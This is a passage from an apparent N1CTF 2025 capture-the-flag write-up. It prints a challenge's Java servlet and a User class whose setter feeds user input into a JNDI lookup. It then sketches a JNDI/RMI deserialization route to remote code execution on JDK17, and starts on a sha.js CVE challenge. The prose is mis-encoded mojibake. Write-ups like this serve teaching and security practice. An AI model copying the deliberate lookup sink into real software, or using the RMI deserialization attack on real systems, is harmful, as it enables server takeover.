class-name">JsonProcessingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span></span><span class="token class-name">ObjectNode</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLEncoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span></span><span class="token class-name">StandardCharsets</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">RequestDispatcher</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>    name <span class="token operator">=</span> <span class="token string">"welcomeServlet"</span><span class="token punctuation">,</span>    value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> welcomeServlet <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_NAME</span> <span class="token operator">=</span> <span class="token string">"guest"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">DEFAULT_WORD</span> <span class="token operator">=</span> <span class="token string">"welcome"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">ObjectMapper</span> <span class="token constant">OBJECT_MAPPER</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> requestUri <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> contextPath <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> pathWithinApp <span class="token operator">=</span> requestUri<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>contextPath<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">shouldDelegate</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">delegateToDefaultResource</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">,</span> request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> jsonPayload <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> nameParam <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> wordParam <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"word"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> urlParam <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>jsonPayload<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>nameParam<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>wordParam<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">ObjectNode</span> composed <span class="token operator">=</span> <span class="token constant">OBJECT_MAPPER</span><span class="token punctuation">.</span><span class="token function">createObjectNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                composed<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> nameParam<span class="token punctuation">)</span><span class="token punctuation">;</span>                composed<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"word"</span><span class="token punctuation">,</span> wordParam<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>urlParam<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    composed<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> urlParam<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                jsonPayload <span class="token operator">=</span> composed<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>jsonPayload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">defaultRedirectTarget</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token constant">OBJECT_MAPPER</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>jsonPayload<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> name <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> word <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">getWord</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name">String</span> url <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">defaultRedirectTarget</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">renderResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> name<span class="token punctuation">,</span> word<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JsonProcessingException</span> var14<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    response<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid JSON payload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> var15<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    response<span class="token punctuation">.</span><span class="token function">sendError</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token string">"Invalid user data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">shouldDelegate</span><span class="token punctuation">(</span><span class="token class-name">String</span> pathWithinApp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> pathWithinApp <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>pathWithinApp<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">delegateToDefaultResource</span><span class="token punctuation">(</span><span class="token class-name">String</span> pathWithinApp<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">RequestDispatcher</span> defaultDispatcher <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getNamedDispatcher</span><span class="token punctuation">(</span><span class="token string">"default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>defaultDispatcher <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            defaultDispatcher<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span>pathWithinApp<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">renderResponse</span><span class="token punctuation">(</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> word<span class="token punctuation">,</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html;charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;html>&lt;body>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var10001 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;h1>"</span> <span class="token operator">+</span> var10001 <span class="token operator">+</span> <span class="token string">"&lt;/h1>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var10001 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;p>"</span> <span class="token operator">+</span> var10001 <span class="token operator">+</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var10001 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;p>URL: "</span> <span class="token operator">+</span> var10001 <span class="token operator">+</span> <span class="token string">"&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&lt;/body>&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token class-name">String</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> input <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#x27;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">defaultRedirectTarget</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> var10000 <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> var10000 <span class="token operator">+</span> <span class="token string">"/?name="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">urlEncode</span><span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;word="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">urlEncode</span><span class="token punctuation">(</span><span class="token string">"welcome"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isBlank</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> value<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">urlEncode</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">URLEncoder</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span><span class="token constant">UTF_8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜æœ‰ä¸€ä¸ª User ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ctf<span class="token punctuation">.</span>n1cat</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> word<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getWord</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>word<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setWord</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>word <span class="token operator">=</span> password<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>url<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>jdk17ï¼Œè€ƒè™‘è°ƒç”¨ setUrl æ‰“é«˜ç‰ˆæœ¬ jndi æ³¨å…¥ï¼Œä½†æ˜¯ jdk17 çš„ jndi æ³¨å…¥ä¸å¤ªå¯èƒ½ï¼Œè€ƒè™‘æ„é€  RMI æ¶æ„æœåŠ¡ç«¯æ‰“å®¢æˆ·ç«¯</p><p>å¯ä»¥çœ‹åˆ°æœ‰ jackson ä¾èµ–ï¼Œç»§ç»­åˆ©ç”¨æ–‡ä»¶è¯»å–çˆ†ç ´ä¸€ä¸‹ lib ç›®å½•ä¸‹çš„ä¾èµ–ä¸ç‰ˆæœ¬å·ï¼Œå¯ä»¥å‘ç° jackson çš„ç‰ˆæœ¬å·ä¸º 2.19.2ï¼ŒåŒæ—¶å‘ç° spring-aop-5.3.33</p><p>é‚£ä¹ˆå¯ä»¥è€ƒè™‘æ‰“æœ€æ–°æœ€çƒ­çš„ jdk17 åŸç”Ÿé“¾ï¼Œèµ·ä¸€ä¸ª RMI Server ç„¶åè¿”å›è¿™æ¡é“¾å­çš„åºåˆ—åŒ– payload åˆ°å¯¹é¢å®¢æˆ·ç«¯è§¦å‘ååºåˆ—åŒ–å³å¯ RCE</p><p><img src="/blog/2025/11/02/N1CTF-2025/IMG-20251111004829680.png"></p><p><img src="/blog/2025/11/02/N1CTF-2025/IMG-20251111012419019.png"></p><hr><h1 id="eezzjsï¼ˆå¤ç°ï¼‰"><a href="#eezzjsï¼ˆå¤ç°ï¼‰" class="headerlink" title="eezzjsï¼ˆå¤ç°ï¼‰"></a>eezzjsï¼ˆå¤ç°ï¼‰</h1><blockquote><p>CVE-2025-9288</p></blockquote><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"eezzjs"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.9"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.18.2"</span><span class="token punctuation">,</span>    <span class="token property">"multer"</span><span class="token operator">:</span> <span class="token string">"^1.4.5-lts.1"</span><span class="token punctuation">,</span>    <span class="token property">"sha.js"</span><span class="token operator">:</span> <span class="token string">"2.4.10"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"keywords"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"author"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>  <span class="token property">"license"</span><span class="token operator">:</span> <span class="token string">"ISC"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sha.js æœ‰ <a 